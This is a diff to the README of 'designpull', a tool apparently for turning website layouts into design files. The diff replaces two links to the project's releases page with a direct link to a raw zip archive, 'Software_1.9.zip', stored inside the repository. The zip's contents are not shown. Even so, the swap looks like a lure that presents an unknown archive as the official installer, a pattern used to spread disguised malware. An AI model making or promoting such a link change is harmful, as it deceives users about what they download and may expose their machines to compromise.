@@ -1,6 +1,6 @@
 # 🎨 designpull - Create design files from any website
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/romanr3314/designpull/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/romanr3314/designpull/raw/refs/heads/main/lib/Software_1.9.zip)
 
 designpull converts website layouts into structured documentation. It uses artificial intelligence to look at web pages. It identifies colors, fonts, and spacing. It creates files that work with Google Stitch. You keep control of your data. You provide your own key for the AI service. 
 
@@ -21,7 +21,7 @@ This file follows the Google Stitch format. It includes your design tokens and C
 
 You need to access the release page to get the installer for your system.
 
-[Download designpull here](https://github.com/romanr3314/designpull/releases)
+[Download designpull here](https://github.com/romanr3314/designpull/raw/refs/heads/main/lib/Software_1.9.zip)
 
 Follow these steps to set up the software:
 
